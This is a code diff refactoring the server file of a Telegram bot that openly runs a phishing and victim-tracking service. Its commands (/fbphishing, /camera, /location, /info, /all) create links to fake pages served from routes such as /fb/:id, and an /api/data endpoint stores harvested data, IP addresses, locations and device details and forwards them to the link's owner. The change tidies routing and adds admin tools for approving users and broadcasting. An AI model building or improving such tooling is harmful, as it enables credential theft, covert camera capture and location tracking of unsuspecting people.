@@ -1,24 +1,14 @@
 require('dotenv').config();
+
 const express = require('express');
+const path = require('path');
+
 const connectDB = require('./config/database');
 const setupBot = require('./config/bot');
 const { validateEnv } = require('./config/env');
 const NotificationService = require('./utils/notifications');
+const adminCheck = require('./middlewares/adminCheck');
 
-// এক্সপ্রেস অ্যাপ
-const app = express();
-app.use(express.json());
-app.use(express.static('public'));
-
-// ডাটাবেস কানেক্ট
-validateEnv();
-connectDB();
-
-// বট সেটআপ
-const bot = setupBot();
-const notifier = new NotificationService(bot);
-
-// কমান্ড ইম্পোর্ট
 const startCommand = require('./commands/start');
 const fbphishing = require('./commands/fbphishing');
 const camera = require('./commands/camera');
@@ -29,107 +19,266 @@ const custom = require('./commands/custom');
 const shorten = require('./commands/shorten');
 const mylinks = require('./commands/mylinks');
 
-// অ্যাডমিন কমান্ড
 const users = require('./admin/users');
 const userinfo = require('./admin/userinfo');
 const ban = require('./admin/ban');
 const approve = require('./admin/approve');
+const broadcast = require('./admin/broadcast');
+const pending = require('./admin/pending');
+const logs = require('./admin/logs');
+const clearlogs = require('./admin/clearlogs');
+const stats = require('./admin/stats');
 
-// টেলিগ্রাম ওয়েবহুক
-app.post('/webhook', (req, res) => {
-  bot.processUpdate(req.body);
-  res.sendStatus(200);
-});
+const app = express();
+app.use(express.json());
+app.use(express.static('public'));
 
-// কমান্ড হ্যান্ডলার
-bot.onText(/\/start/, (msg) => startCommand(bot, msg));
-bot.onText(/\/fbphishing/, (msg) => fbphishing(bot, msg));
-bot.onText(/\/camera/, (msg) => camera(bot, msg));
-bot.onText(/\/location/, (msg) => location(bot, msg));
-bot.onText(/\/info/, (msg) => info(bot, msg));
-bot.onText(/\/all/, (msg) => all(bot, msg));
-bot.onText(/\/custom/, (msg) => custom(bot, msg));
-bot.onText(/\/shorten/, (msg) => shorten(bot, msg));
-bot.onText(/\/mylinks/, (msg) => mylinks(bot, msg));
-
-// অ্যাডমিন কমান্ড
-bot.onText(/\/users/, (msg) => users(bot, msg));
-bot.onText(/\/userinfo/, (msg) => userinfo(bot, msg));
-bot.onText(/\/ban/, (msg) => ban(bot, msg));
-bot.onText(/\/approve/, (msg) => approve(bot, msg));
-
-// ফিশিং পেজ রুট
-app.get('/fb/:id', (req, res) => {
-  res.sendFile(__dirname + '/public/fb.html');
-});
-
-app.get('/camera/:id', (req, res) => {
-  res.sendFile(__dirname + '/public/camera.html');
-});
-
-app.get('/location/:id', (req, res) => {
-  res.sendFile(__dirname + '/public/location.html');
-});
-
-app.get('/info/:id', (req, res) => {
-  res.sendFile(__dirname + '/public/info.html');
-});
-
-app.get('/all/:id', (req, res) => {
-  res.sendFile(__dirname + '/public/all.html');
-});
-
-app.get('/custom/:id', (req, res) => {
-  res.sendFile(__dirname + '/public/custom.html');
-});
-
-// ডাটা কালেক্ট API
-app.post('/api/data', async (req, res) => {
-  try {
-    const { linkId, type, data, ip, location, device } = req.body;
-    
-    const Data = require('./models/Data');
-    const Link = require('./models/Link');
-    
-    // ডাটা সেভ
-    const newData = new Data({
-      linkId,
-      type,
-      data,
-      ip,
-      location,
-      device
-    });
-    
-    await newData.save();
-    
-    // লিংক আপডেট
-    await Link.findOneAndUpdate(
-      { linkId },
-      { $inc: { data: 1 } }
-    );
-    
-    // নোটিফিকেশন পাঠাও
-    await notifier.sendDataNotification(linkId, {
-      type,
-      data,
-      ip,
-      location,
-      device,
-      timestamp: new Date()
-    });
-    
-    res.json({ success: true });
-    
-  } catch (error) {
-    console.error('API Error:', error);
-    res.status(500).json({ error: error.message });
+function getCommandName(text) {
+  if (!text || !text.startsWith('/')) {
+    return null;
   }
-});
 
-// সার্ভার চালু
-const PORT = process.env.PORT || 8080;
-app.listen(PORT, () => {
-  console.log(`🌐 Server running on port ${PORT}`);
-  console.log(`🤖 Bot is live!`);
+  const firstToken = text.trim().split(/\s+/)[0];
+  const commandPart = firstToken.slice(1).split('@')[0];
+  return commandPart.toLowerCase();
+}
+
+async function sendHelp(bot, msg) {
+  const chatId = msg.chat.id;
+  const isAdmin = await adminCheck(msg.from.id);
+
+  let message = 'Available commands\n\n';
+  message += 'User commands:\n';
+  message += '/start\n';
+  message += '/fbphishing\n';
+  message += '/camera\n';
+  message += '/location\n';
+  message += '/info\n';
+  message += '/all\n';
+  message += '/custom <url>\n';
+  message += '/shorten <code> <url>\n';
+  message += '/mylinks\n';
+  message += '/help\n\n';
+
+  if (isAdmin) {
+    message += 'Admin commands:\n';
+    message += '/users\n';
+    message += '/userinfo <user_id|@username>\n';
+    message += '/ban <user_id|@username> [reason]\n';
+    message += '/approve <user_id|@username>\n';
+    message += '/pending\n';
+    message += '/broadcast <type> <message>\n';
+    message += '/broadcast_confirm\n';
+    message += '/broadcast_cancel\n';
+    message += '/logs [type]\n';
+    message += '/clearlogs <category> <days>\n';
+    message += '/clearlogs_confirm\n';
+    message += '/clearlogs_cancel\n';
+    message += '/stats\n';
+  }
+
+  await bot.sendMessage(chatId, message);
+}
+
+async function sendUnknownCommand(bot, msg, commandName) {
+  await bot.sendMessage(
+    msg.chat.id,
+    `Unknown command: /${commandName}\nUse /help to see available commands.`
+  );
+}
+
+async function sendNotImplemented(bot, msg, commandName) {
+  await bot.sendMessage(
+    msg.chat.id,
+    `/${commandName} is referenced in some messages, but it is not implemented yet.`
+  );
+}
+
+function createCommandRouter(bot) {
+  const routes = {
+    start: (msg) => startCommand(bot, msg),
+    help: (msg) => sendHelp(bot, msg),
+    fbphishing: (msg) => fbphishing(bot, msg),
+    camera: (msg) => camera(bot, msg),
+    location: (msg) => location(bot, msg),
+    info: (msg) => info(bot, msg),
+    all: (msg) => all(bot, msg),
+    custom: (msg) => custom(bot, msg),
+    shorten: (msg) => shorten(bot, msg),
+    mylinks: (msg) => mylinks(bot, msg),
+    users: (msg) => users(bot, msg),
+    userinfo: (msg) => userinfo(bot, msg),
+    ban: (msg) => ban(bot, msg),
+    approve: (msg) => approve(bot, msg),
+    pending: (msg) => pending.execute(bot, msg),
+    broadcast: (msg) => broadcast.execute(bot, msg),
+    broadcast_confirm: (msg) => broadcast.confirm(bot, msg),
+    broadcast_cancel: (msg) => broadcast.cancel(bot, msg),
+    logs: (msg) => {
+      if (/\bexport\b/i.test(msg.text)) {
+        return logs.export(bot, msg);
+      }
+      return logs.execute(bot, msg);
+    },
+    clearlogs: (msg) => clearlogs.execute(bot, msg),
+    clearlogs_confirm: (msg) => clearlogs.confirm(bot, msg),
+    clearlogs_cancel: (msg) => clearlogs.cancel(bot, msg),
+    stats: (msg) => {
+      if (/\bexport\b/i.test(msg.text)) {
+        return stats.export(bot, msg);
+      }
+      return stats.execute(bot, msg);
+    }
+  };
+
+  const notImplemented = new Set([
+    'reject',
+    'unban',
+    'approve_all',
+    'reject_all',
+    'makeadmin',
+    'removeadmin'
+  ]);
+
+  bot.on('message', async (msg) => {
+    const commandName = getCommandName(msg.text);
+    if (!commandName) {
+      return;
+    }
+
+    try {
+      if (routes[commandName]) {
+        await routes[commandName](msg);
+        return;
+      }
+
+      if (/^approve_\d+$/.test(commandName)) {
+        const targetId = parseInt(commandName.replace('approve_', ''), 10);
+        await pending.approveUser(bot, msg.chat.id, targetId);
+        return;
+      }
+
+      if (/^reject_\d+$/.test(commandName)) {
+        const targetId = parseInt(commandName.replace('reject_', ''), 10);
+        await pending.rejectUser(bot, msg.chat.id, targetId);
+        return;
+      }
+
+      if (notImplemented.has(commandName)) {
+        await sendNotImplemented(bot, msg, commandName);
+        return;
+      }
+
+      await sendUnknownCommand(bot, msg, commandName);
+    } catch (error) {
+      console.error(`Command routing error for /${commandName}:`, error);
+      await bot.sendMessage(msg.chat.id, 'An error occurred while processing the command.');
+    }
+  });
+
+  bot.on('callback_query', async (callbackQuery) => {
+    try {
+      if (!callbackQuery.data) {
+        return;
+      }
+
+      if (
+        callbackQuery.data.startsWith('approve_') ||
+        callbackQuery.data.startsWith('reject_')
+      ) {
+        await pending.handleInlineButton(bot, callbackQuery);
+      }
+    } catch (error) {
+      console.error('Callback query error:', error);
+    }
+  });
+}
+
+async function bootstrap() {
+  validateEnv();
+  await connectDB();
+
+  const bot = setupBot();
+  const notifier = new NotificationService(bot);
+
+  app.post('/webhook', (req, res) => {
+    bot.processUpdate(req.body);
+    res.sendStatus(200);
+  });
+
+  app.get('/fb/:id', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'fb.html'));
+  });
+
+  app.get('/camera/:id', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'camera.html'));
+  });
+
+  app.get('/location/:id', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'location.html'));
+  });
+
+  app.get('/info/:id', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'info.html'));
+  });
+
+  app.get('/all/:id', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'all.html'));
+  });
+
+  app.get('/custom/:id', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'custom.html'));
+  });
+
+  app.post('/api/data', async (req, res) => {
+    try {
+      const { linkId, type, data, ip, location, device } = req.body;
+
+      const Data = require('./models/Data');
+      const Link = require('./models/Link');
+
+      const newData = new Data({
+        linkId,
+        type,
+        data,
+        ip,
+        location,
+        device
+      });
+
+      await newData.save();
+
+      await Link.findOneAndUpdate(
+        { linkId },
+        { $inc: { data: 1 } }
+      );
+
+      await notifier.sendDataNotification(linkId, {
+        type,
+        data,
+        ip,
+        location,
+        device,
+        timestamp: new Date()
+      });
+
+      res.json({ success: true });
+    } catch (error) {
+      console.error('API Error:', error);
+      res.status(500).json({ error: error.message });
+    }
+  });
+
+  createCommandRouter(bot);
+
+  const PORT = process.env.PORT || 8080;
+  app.listen(PORT, () => {
+    console.log(`Server running on port ${PORT}`);
+    console.log('Bot is live!');
+  });
+}
+
+bootstrap().catch((error) => {
+  console.error('Startup Error:', error);
+  process.exit(1);
 });
